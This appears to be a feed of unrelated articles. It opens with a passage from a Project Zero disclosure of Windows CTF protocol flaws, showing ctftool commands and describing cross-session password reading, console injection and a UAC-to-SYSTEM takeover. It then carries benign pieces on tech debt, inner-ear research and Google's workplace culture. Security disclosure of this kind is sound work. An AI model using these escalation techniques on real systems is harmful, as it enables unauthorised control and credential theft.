&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;You can read more notes on the exploitation process &lt;a href=&quot;https://github.com/taviso/ctftool#exploitation-notes&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;c12 c2&quot;&gt;&lt;br/&gt;&lt;/span&gt; &lt;span class=&quot;c12 c2&quot;&gt;The &quot;TIP&quot; of the iceberg...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;The memory corruption flaws in the CTF protocol can be exploited in a default configuration, regardless of region or language settings. This doesn't even begin to scratch the surface of potential attacks for users that rely on out-of-process TIPs, &lt;span class=&quot;c2&quot;&gt;Text Input Processors&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;If you have Chinese (Simplified, Traditional, and others), Japanese, Korean or many other&lt;sup&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html#ftnt4&quot; id=&quot;ftnt_ref4&quot;&gt;[4]&lt;/a&gt;&lt;/sup&gt;&lt;span class=&quot;c0&quot;&gt; languages installed, then you have a language with extended capabilities. Any CTF client can select this language for another client, just having it installed is enough, it doesn't have to be enabled or in use.&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;c0&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;This allows any CTF client to read and write the text of any window, from any other session. &lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;c0&quot;&gt;&lt;br/&gt;&lt;/span&gt; &lt;span class=&quot;c0&quot;&gt;Using ctftool we can, for example, replace the text in notepad with our own text.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;connect&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NtAlpcConnectPort(&quot;\BaseNamedObjects\msctf.serverDefault1&quot;) =&amp;gt; 0&lt;/span&gt;&lt;/div&gt;

&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;The obvious attack is an unprivileged user injecting commands into an Administrator's console session, or reading passwords as users log in. Even sandboxed AppContainer processes can perform the same attack.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Another interesting attack is taking control of the UAC consent dialog, which runs as NT AUTHORITY\SYSTEM. An unprivileged standard user&lt;span class=&quot;c0&quot;&gt; can cause consent.exe to spawn using the &quot;runas&quot; verb with ShellExecute(), then simply become SYSTEM.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c25 c32 subtitle&quot; id=&quot;h.1ltaf9c1fo8w&quot;&gt;The UAC consent dialog is a CTF client that runs as SYSTEM. For screenshot purposes I lowered the UAC level here, but it works at any level. By default, it uses the &quot;secure&quot; desktop.... but there is no access control whichever level you choose ¯\&lt;span class=&quot;c21&quot;&gt;_(ツ)_/¯&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;ated.Winlogon1S-1-5-18&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;consent.exe        pid: 6844   type: Mutant         450: \Sessions\1\BaseNamedObjects\MSCTF.Asm.Mute&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;xWinlogon1&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;consent.exe        pid: 6844   type: Mutant         454: \Sessions\1\BaseNamedObjects\MSCTF.CtfServe&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;rMutexWinlogon1&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;&lt;br/&gt;&lt;/span&gt; I've implemented this attack in ctftool, follow the steps &lt;a href=&quot;https://github.com/taviso/ctftool#Exploit&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt; to try it.&lt;br/&gt;&lt;span class=&quot;c12 c2&quot;&gt;&lt;br/&gt;&lt;/span&gt; &lt;span class=&quot;c12 c2&quot;&gt;So what does it all mean?&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Even without bugs, the CTF protocol allows applications to exchange input and read each other's content. However, there are a lot of protocol bugs that allow taking complete control of almost any other application.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;It will be interesting to see how Microsoft decides to modernize the protocol.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;If you want to investigate further, I’m releasing the tool I developed for this project.&lt;/span&gt;&lt;/div&gt;



&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Conclusion&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;It took a lot of effort and research to reach the point that I could understand enough of CTF to realize it’s broken. These are the kind of hidden attack surfaces where bugs last for years. It turns out it &lt;strong&gt;&lt;em&gt;was &lt;/em&gt;&lt;/strong&gt;&lt;/span&gt;possible to reach across sessions and violate NT security boundaries for nearly twenty years, and nobody noticed.&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;
&lt;div&gt;&lt;span class=&quot;c0&quot;&gt;Now that there is tooling available, it will be harder for these bugs to hide going forward.&lt;/span&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c61&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c34 c2&quot;&gt;Bonus... &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;an you pop &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;calc&lt;/span&gt;&lt;span class=&quot;c2&quot;&gt; in &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;calc&lt;/span&gt;&lt;span class=&quot;c36 c2 c62&quot;&gt;?&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c25&quot;&gt;In Windows 10, Calculator uses &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/secauthz/appcontainer-isolation&quot;&gt;AppContainer isolation&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, just like Microsoft Edge. However the kernel still forces AppContainer processes to join the ctf session.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c65&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c33 c36 c34 c85&quot;&gt;scan&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c26&quot;&gt;Client 0, Tid 2880 (Flags 0x08, Hwnd 00000B40, Pid 3048, explorer.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c26&quot;&gt;Client 1, Tid 8560 (Flags 0x0c, Hwnd 00002170, Pid 8492, SearchUI.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c65&quot;&gt;Client 2, Tid 11880 (Flags 0x0c, Hwnd 00002E68, Pid 14776, &lt;/span&gt;&lt;span class=&quot;c65 c35&quot;&gt;Calculator.exe&lt;/span&gt;&lt;span class=&quot;c26&quot;&gt;)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c26&quot;&gt;Client 3, Tid 1692 (Flags 0x0c, Hwnd 0000069C, Pid 15000, MicrosoftEdge.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c26&quot;&gt;Client 4, Tid 724 (Flags 0x0c, Hwnd 00001C38, Pid 2752, MicrosoftEdgeCP.exe)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c25&quot;&gt;This means you &lt;span class=&quot;c2&quot;&gt;can &lt;/span&gt;compromise Calculator, and from there &lt;span class=&quot;c0&quot;&gt;compromise any other CTF client.. even non AppContainer clients like explorer.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c0&quot;&gt;On Windows 8 and earlier, compromising calc is as simple as any other CTF client.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c25&quot;&gt;So yes, you can pop calc&lt;span class=&quot;c0&quot;&gt; in calc 😃&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;hr class=&quot;c64&quot;/&gt;
&lt;div&gt;

My best guess is it's from &lt;/span&gt;&lt;span class=&quot;c14 c75&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;http://web.mst.edu/~cpp/common/hungarian.html&quot;&gt;hungarian notation&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c75&quot;&gt;, i.e. &lt;/span&gt;&lt;span class=&quot;c75&quot;&gt;CTextFramework&lt;/span&gt;&lt;span class=&quot;c33 c52&quot;&gt;.&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div class=&quot;c7 c25 c32 subtitle&quot; id=&quot;h.9ezdtt7udsyp&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html#ftnt_ref3&quot; id=&quot;ftnt3&quot;&gt;[3]&lt;/a&gt;&lt;span class=&quot;c21&quot;&gt; Adding support for Windows Vista would be trivial. XP support, while possible, would be more effort.&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

<title>Three Kinds of Good Tech Debt</title>
<link>https://engineering.squarespace.com/blog/2019/three-kinds-of-good-tech-debt</link>
<guid isPermaLink="true" >https://engineering.squarespace.com/blog/2019/three-kinds-of-good-tech-debt</guid>
<description>&lt;p&gt;“Tech debt” is a dirty word in the software engineering world. It’s often said with an air of regret; a past mistake that will eventually need to be atoned for with refactoring.&lt;/p&gt;
&lt;p&gt;Financial debt isn’t universally reviled in the same way. Your friend takes out a mortgage to buy a house and what do you say? Congratulations! Bonds are a standard form of financing for infrastructure and public works. Businesses use all kinds of debt, and Wall Street shows its confidence in the form of higher stock prices.&lt;/p&gt;
&lt;p&gt;The difference is intention. What if tech debt wasn’t always an accident, caused by incorrect assumptions and unexpected circumstances? How would you spend a tech debt mortgage?&lt;/p&gt;
&lt;p&gt;If we define tech debt as work that will have to be done in the future, we can track spending in terms of the time that will be spent on that future work. We can also “invest” time in work done now.&lt;/p&gt;
&lt;p&gt;This mental model has helped me avoid spending foolishly and paying in maintenance for a system I couldn’t afford, and it’s given me a way to see opportunities to use tech debt intentionally. Here are a few cases where taking on tech debt helped my projects succeed.&lt;/p&gt;
&lt;h2 id=&quot;scaffolding&quot;&gt;Scaffolding&lt;/h2&gt;
&lt;p&gt;When I’m deciding how to prioritize the major parts of a big project, my goal is to validate the riskiest parts of the project first. By risky, I mean the parts that are easiest to get wrong, because they’re complicated, difficult to define, not well understood, or have some other smell that “here be dragons.” Because these components are the most difficult part of the project to build, I build them first while the codebase is smaller and easier to evolve.&lt;/p&gt;
&lt;p&gt;It’s not enough to just build the risky components, however. I need to know that I built these risky components correctly. You never know until you try it, so I try to get my code into a real-world situation as quickly as possible. This usually means finding a way to make something useful with the risky parts before moving on to build the rest of the application.&lt;/p&gt;
&lt;p&gt;When our team was developing &lt;a href=&quot;https://www.squarespace.com/email-marketing&quot;&gt;Squarespace Email Campaigns&lt;/a&gt;, this meant building the email editor first. Squarespace is known for top-tier design and powerful content-editing tools, and we wanted to build something that topped the competition. After a couple of months, we had an editor we were excited to show coworkers, but we hadn’t yet built the system to actually send the email. We weren’t going to get the real-world feedback we needed if the editor was just a toy app that couldn’t send email.&lt;/p&gt;
&lt;p&gt;The finished product was going to need the capability to send hundreds of millions of emails quickly and reliably, but we didn’t need that capability &lt;em&gt;right now&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;So we asked ourselves, “What’s the simplest thing that would make the editor useful to our coworkers?” Squarespace only had several hundred employees at the time and internal testers could tolerate a little unreliability. Something that sends a few hundred emails unreliably is WAY easier to build than the robust system we’d been considering. We realized we could build something cheap that we didn’t mind throwing away later—scaffolding—to unblock getting user feedback sooner.&lt;/p&gt;
&lt;p&gt;Several self-imposed guidelines helped the implementation of our scaffolding go smoothly:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;We committed to our estimate. If we couldn’t complete the scaffolding in the estimated timeframe, it was a sign that we were taking on too much complexity and needed to rethink our approach.&lt;/li&gt;
&lt;li&gt;It was designed to be thrown away, and communicated as such from the get-go. The code was well contained, and we didn’t waste time nitpicking over minor implementation details.&lt;/li&gt;
&lt;li&gt;We understood the scaffolding’s limitations, and avoided using it in a situation where a failure would cause harm. We’d be going deeper into debt than expected if we spent time cleaning up errors caused by the scaffolding, so we were very intentional about the testing situations the scaffolding was used in.&lt;/li&gt;
&lt;li&gt;Stakeholders knew we were deliberately taking on debt. We bragged about these limitations with our stakeholders and users as if they were features—“Look at all the time we saved!”—and in the process made sure they knew we would need to invest time later to build the real email delivery system.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Scaffolding can help you adjust the order in which you build parts of your application by filling in for dependencies, so that you’re not stuck building components before you have a way to validate them. Our throw-away email sender got us feedback on the email editor while the code was still fresh in our minds, helping us iterate faster and perfect our hardest problem. When it came time to build the real email sender, we did it with lessons learned from building the scaffolding.&lt;/p&gt;
&lt;h2 id=&quot;hardcoding-things&quot;&gt;Hardcoding Things&lt;/h2&gt;
&lt;p&gt;The dashboard area of a product I worked on recently features an area for seasonal messaging, e.g., “Wish your subscribers a Happy Holidays.” Every month or two, our team would schedule new content to show in that area of the dashboard.&lt;/p&gt;
&lt;p&gt;We needed a Content Management System (CMS) to allow our product manager (PM) and designer to update the dashboard message themselves. Squarespace is a CMS company after all! Also, PMs usually wanted the dashboard to update at a specific time, and engineers didn’t want to time production releases manually in reaction to these requests.&lt;/p&gt;
&lt;p&gt;One approach would have been to build a database-backed CMS, allowing the various members of our team to update the dashboard content instantly and without engineer intervention.&lt;/p&gt;
&lt;p&gt;Unfortunately, this approach comes with costs: additional frontends, validations, and data to manage. These hidden costs are the bad kind of tech debt, saddling future developers with more maintenance work than the feature is worth. Additionally, we expected our dashboard message content to go weeks without changing, so we wouldn’t benefit from a solution that provided instant updates.&lt;/p&gt;
&lt;p&gt;So instead of taking on the overhead of a database-backed CMS, we stored our content in a YAML file and reused existing tools to provide CMS functionality. The user interface to change the dashboard messaging became a text editor and Git instead of a browser UI. Other team members would validate these changes via code review, so we didn’t need to spend time writing validations and error handlers. Content changes are automatically synced across environments by our existing CI tools.&lt;/p&gt;
&lt;p&gt;Exposing new content at a specific time was accomplished with yet more hardcoding. To paraphrase:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;if now &amp;gt;= NEW_CONTENT_DATE
  show new content
else
  show old content&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;I consider a few factors when deciding whether to hardcode something:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Is it okay for changes to take several hours to take effect? Hardcoding comes with a clear limitation: changes require deploying new code to production. Failing to acknowledge limitations can tip something into a maintenance headache, creating bad tech debt.&lt;/li&gt;
&lt;li&gt;Is Git an acceptable update user interface? Updates will require interacting with your team’s version control tool, and maybe the CI system. To avoid introducing additional coordination or training overhead, we use the test: is there someone already involved in the process who knows Git?&lt;/li&gt;
&lt;li&gt;Are there existing UI, validation, and data patterns? Hardcoding brings the biggest benefits when it helps you avoid defining new patterns. If your application already has patterns that cleanly solve your problem, hardcoding might not be worth the drawbacks.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Allow-lists, form field options, and feature flags are other patterns that you can usually consider hardcoding.&lt;/p&gt;
&lt;h2 id=&quot;not-fixing-all-the-edge-cases&quot;&gt;Not Fixing All the Edge Cases&lt;/h2&gt;
&lt;p&gt;I once had to build a feature that allowed a user to create up to 10 items but didn’t allow more than 10. There’s a common race condition here: if we issue two create-item requests at nearly the same time, both requests will count the existing number of items, and then both requests will create items. If we do this when there’s already nine items, we can beat the limit and end up with 11 items.&lt;/p&gt;
&lt;p&gt;Most QA testers would consider this a bug, and bugs are just tech debt that users can see.&lt;/p&gt;
&lt;p&gt;Database transactions can help, but we’re using a NoSQL database that doesn’t support transactions. Read/write locks would work, but we’re operating in a distributed system so we’d need distributed locks. If we wrote a bunch of locking code to make the limit “perfect” we may end up introducing new, unexpected bugs. And we’d have to spend time writing a bunch of locking code—and every developer who works on this after us has to understand that locking code.&lt;/p&gt;
&lt;p&gt;This feels like a lot of effort to keep a user from making one extra item. What about a non-technical solution: what if we intentionally didn’t fix the race condition?&lt;/p&gt;
&lt;p&gt;Now I’m not saying quietly leave it there for the next developer to deal with! Being intentional here meant answering some questions:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;What happens when there are 11 items? Well, not much, actually. It was an arbitrary limit and the rest of the app doesn’t care about a few extra items.&lt;/li&gt;
&lt;li&gt;Can we find out if this race condition happens more often than expected? Yup, a simple database query found accounts with more than 10 items, and each item record had a timestamp. Turns out this race condition didn’t occur in production.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;We were better off leaving this tech debt unpaid. Because the impact of creating an extra item was low and easy to monitor, we could spend time on higher-priority work instead of addressing a practical non-issue.&lt;/p&gt;
&lt;h2 id=&quot;good-tech-debt-is-intentional&quot;&gt;Good Tech Debt Is Intentional&lt;/h2&gt;
&lt;p&gt;A lot of bad tech debt comes from building too much and getting stuck spending more time on maintenance and bug fixes than expected. It’s like buying too much house and ending up in an underwater mortgage.&lt;/p&gt;
&lt;p&gt;The key is to be intentional about what you invest time in and aware of the costs you’re taking on. Err on the side of building too little because you can always build more later. Build things to be easy to throw away and replace; it’ll make your code more modular. Good tech debt has clear, well-known limitations. Document these in code comments, READMEs, FAQs, and conversations with the people who’d care.&lt;/p&gt;
&lt;p&gt;Used carefully, good tech debt will help you build software faster by focusing your time on the things that matter most.&lt;/p&gt;

<title>Proteins That May Restore Damaged Sound-Detecting Cells in the Ear</title>

<guid isPermaLink="true" >https://www.hopkinsmedicine.org/news/newsroom/news-releases/researchers-find-proteins-that-might-restore-damaged-sound-detecting-cells-in-the-ear</guid>
<description>&lt;div id=&quot;news-intro&quot; readability=&quot;23.036496350365&quot;&gt;
&lt;p&gt;Using genetic tools in mice, researchers at Johns Hopkins Medicine say they have identified a pair of proteins that precisely control when sound-detecting cells, known as hair cells, are born in the mammalian inner ear. The proteins, described in a report published June 12 in &lt;a href=&quot;https://elifesciences.org/articles/47613&quot;&gt;&lt;em&gt;eLife&lt;/em&gt;&lt;/a&gt;, may hold a key to future therapies to restore hearing in people with irreversible deafness. &lt;/p&gt;
&lt;p&gt;“Scientists in our field have long been looking for the molecular signals that trigger the formation of the hair cells that sense and transmit sound,” says &lt;a href=&quot;https://www.hopkinsmedicine.org/profiles/results/directory/profile/6477655/angelika-doetzlhofer&quot;&gt;Angelika Doetzlhofer, Ph.D.,&lt;/a&gt; associate professor of neuroscience at the Johns Hopkins University School of Medicine. “These hair cells are a major player in hearing loss, and knowing more about how they develop will help us figure out ways to replace hair cells that are damaged.”&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;news-full&quot; readability=&quot;95.574229691877&quot;&gt;In order for mammals to hear, sound vibrations travel through a hollow, snail shell-looking structure called the cochlea. Lining the inside of the cochlea are two types of sound-detecting cells, inner and outer hair cells, which convey sound information to the brain.
&lt;p&gt;An estimated 90% of genetic hearing loss is caused by problems with hair cells or damage to the auditory nerves that connect the hair cells to the brain. Deafness due to exposure to loud noises or certain viral infections arises from damage to hair cells. Unlike their counterparts in other mammals and birds, human hair cells cannot regenerate. So, once hair cells are damaged, hearing loss is likely permanent.&lt;/p&gt;
&lt;p&gt;Scientists have known that the first step in hair cell birth starts at the outermost part of the spiraled cochlea. Here, precursor cells start transforming into hair cells. Then, like sports fans performing “the wave” in a stadium, precursor cells along the spiral shape of the cochlea turn into hair cells along a wave of transformation that stops when it reaches the inner part of the cochlea. Knowing where hair cells start their development, Doetzlhofer and her team went in search of molecular cues that were in the right place and at the right time along the cochlear spiral.&lt;/p&gt;
&lt;p&gt;Of the proteins the researchers examined, the pattern of two proteins, Activin A and follistatin, stood out from the rest. Along the spiral path of the cochlea, levels of Activin A increased where precursor cells were turning into hair cells. Follistatin, however, appeared to have the opposite behavior of Activin A. Its levels were low in the outermost part of the cochlea when precursor cells were first starting to transform into hair cells and high at the innermost part of the cochlea’s spiral where precursor cells hadn’t yet started their conversion. Activin A seemed to move in a wave inward, while follistatin moved in a wave outward.&lt;/p&gt;
&lt;p&gt;“In nature, we knew that Activin A and follistatin work in opposite ways to regulate cells,” says Doetzlhofer. “And so, it seems, based on our findings like in the ear, the two proteins perform a balancing act on precursor cells to control the orderly formation of hair cells along the cochlear spiral.”&lt;/p&gt;
&lt;p&gt;To figure out how exactly Activin A and follistatin coordinate hair cell development, the researchers studied the effects of each of the two proteins individually. First, they increased the levels of Activin A in the cochleas of normal mice. In these animals, precursor cells transformed to hair cells too early, causing hair cells to appear prematurely all along the cochlear spiral. In mice engineered to either overproduce follistatin or not produce Activin A at all, hair cells were late to form and appeared disorganized and scattered across multiple rows inside the cochlea.&lt;/p&gt;
&lt;p&gt;“The action of Activin A and follistatin is so precisely timed during development that any disturbance can negatively affect the organization of the cochlea,” says Doetzlhofer. “It’s like building a house — if the foundation is not laid correctly, anything built upon it is affected.”&lt;/p&gt;
&lt;p&gt;Looking more closely at why overproduction of follistatin results in disorganized hair cells, the researchers found that high levels of this protein caused precursor cells to divide more frequently, which in turn made more of them convert into inner hair cells in a haphazard way.&lt;/p&gt;
&lt;p&gt;Doetzlhofer notes that her research in hair cell development, although fundamental, has potential applications to treat deafness caused by damaged hair cells: “We are interested in how hair cells evolved because it’s an interesting biological question,” she says. “But we also want to use that knowledge to improve or develop new treatment strategies for hearing loss.”&lt;/p&gt;
&lt;p&gt;The research was supported by the National Institute on Deafness and Other Communication Disorders (DC011571, DC013477, DC012972 and DC016538) and the David M. Rubenstein Fund for Hearing Research.&lt;/p&gt;
&lt;p&gt;Other contributors to the research include Meenakshi Prajapati-DiNubila, Ana Benito-Gonzales, Erin J. Golden and Shuran Zhang, all from Johns Hopkins School of Medicine.&lt;/p&gt;

<title>Three Years of Misery Inside Google, the Happiest Company in Tech</title>

<guid isPermaLink="true" >https://www.wired.com/story/inside-google-three-years-misery-happiest-company-tech/</guid>
<description>&lt;section class=&quot;section-break-component&quot; readability=&quot;216.33032490975&quot;&gt;&lt;div class=&quot;callout-embed-component intro&quot; readability=&quot;18.811258278146&quot;&gt;
&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;On a bright&lt;/span&gt; Monday in January 2017, at 2:30 in the afternoon, about a thousand &lt;a href=&quot;https://www.wired.com/tag/google/&quot;&gt;Google&lt;/a&gt; employees—horrified, alarmed, and a little giddy—began pouring out of the company's offices in Mountain View, California. They packed themselves into a cheerful courtyard outside the main campus café, a parklike area dotted with picnic tables and a shade structure that resembles a giant game of pickup sticks. Many of them held up handmade signs: “Proud Iranian-American Googler,” “Even Introverts Are Here,” and of course, “Don't Be Evil!” written in the same kindergarten colors as the Google logo.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;After a few&lt;/span&gt; rounds of call-and-response chanting and testimonials from individual staffers, someone adjusted the rally's microphone for the next speaker's tall, lanky frame. &lt;a href=&quot;https://www.wired.com/tag/sundar-pichai/&quot;&gt;Sundar Pichai&lt;/a&gt;, Google's soft-spoken CEO of 15 months, stood in the small clearing in the dense crowd that served as a makeshift stage. “Over the last 24 to 48 hours, we've all been working very hard,” he said, “and every step of the way I've felt the support of 60,000 people behind me.”&lt;/p&gt;
&lt;p&gt;It was, to be precise, January 30; Donald Trump's presidency was 10 days old. And Executive Order 13769—&lt;a href=&quot;https://www.wired.com/2017/01/trumps-refugee-ban-direct-assault-civil-liberties/&quot;&gt;a federal travel ban&lt;/a&gt; on citizens from Iran, Iraq, Libya, Somalia, Sudan, Syria, and Yemen, and a wholesale suspension of US refugee admissions—had been in effect for 73 hours, trapping hundreds of travelers in limbo at the nation's airports. For the moment, the company's trademark admonition against evil was being directed at a clear, unmistakably external target: the White House.&lt;/p&gt;
&lt;div class=&quot;inset-left-component inset-left-component--image&quot; readability=&quot;3.7959183673469&quot;&gt;


&lt;p&gt;&lt;cite class=&quot;caption-component__credit&quot;&gt;Alex Anderson&lt;/cite&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;To all the world it looked as if Google—one of the most powerful, pro-immigrant, and ostensibly progressive corporations in the United States—was taking a unified stand. But that appearance of unanimity masked a welter of executive-level indecision and anxiety. It probably would have been more apt if Pichai had said that, over the previous 48 hours, he had been backed into a corner by thousands of his employees.&lt;/p&gt;

&lt;p&gt;In those first days of the Trump era, Google's leaders were desperate to avoid confrontation with the new regime. The company's history of close ties to the Obama administration left executives feeling especially vulnerable to the reactionary movement—incubated partly on Google's own video platform, &lt;a href=&quot;https://www.wired.com/tag/youtube/&quot;&gt;YouTube&lt;/a&gt;—that had memed, rallied, and voted Trump into office. (It didn't help that Eric Schmidt, then executive chairman of Google's parent company, &lt;a href=&quot;https://www.wired.com/tag/alphabet/&quot;&gt;Alphabet&lt;/a&gt;, had been an adviser to Hillary Clinton's campaign, or that some 90 percent of political donations by Google employees had gone to Democrats in 2016.) Kent Walker, Google's risk-averse vice president of public policy, had been advising staffers not to do anything that might upset Steve Bannon or Breitbart. So when the travel ban was announced on the afternoon of Friday, January 27, Google executives initially hoped to “just keep [their] heads down and allow it to blow over,” according to an employee who was close to those early calculations.&lt;/p&gt;
&lt;p&gt;But the tribal dictates of Google's own workforce made lying low pretty much impossible. &lt;a href=&quot;https://www.wired.com/tag/larry-page/&quot;&gt;Larry Page&lt;/a&gt; and &lt;a href=&quot;https://www.wired.com/tag/sergey-brin/&quot;&gt;Sergey Brin&lt;/a&gt;, the former Montessori kids who founded Google as Stanford grad students in the late '90s, had designed their company's famously open culture to facilitate free thinking. Employees were “obligated to dissent” if they saw something they disagreed with, and they were encouraged to “bring their whole selves” to work rather than check their politics and personal lives at the door. And the wild thing about Google was that so many employees complied. They weighed in on thousands of online mailing lists, including IndustryInfo, a mega forum with more than 30,000 members; Coffee Beans, a forum for discussing diversity; and Poly-Discuss, a list for &lt;a href=&quot;https://www.wired.com/2017/04/silicon-valley-polyamory/&quot;&gt;polyamorous&lt;/a&gt; Googlers. They posted incessantly on an employee-only version of Google+ and on Memegen, an internal tool for creating and upvoting memes. On Thursdays, Google would host a company-wide meeting called TGIF, known for its no-holds-barred Q&amp;amp;As where employees could, and did, aggressively challenge executives.&lt;/p&gt;
&lt;p&gt;All that oversharing and debate was made possible by another element of Google's social contract. Like other corporations, Google enforces strict policies requiring employees to keep company business confidential. But for Google employees, nondisclosure wasn't just a rule, it was a sacred bargain—one that earned them candor from leadership and a safe space to speak freely about their kinks, grievances, and disagreements on internal forums.&lt;/p&gt;


&lt;p&gt;Finally, to a remarkable extent, Google's workers really do take “Don't Be Evil” to heart. C-suite meetings have been known to grind to a halt if someone asks, “Wait, is this evil?” To many employees, it's axiomatic: Facebook is craven, Amazon is aggro, Apple is secretive, and Microsoft is staid, but Google genuinely wants to do good.&lt;/p&gt;
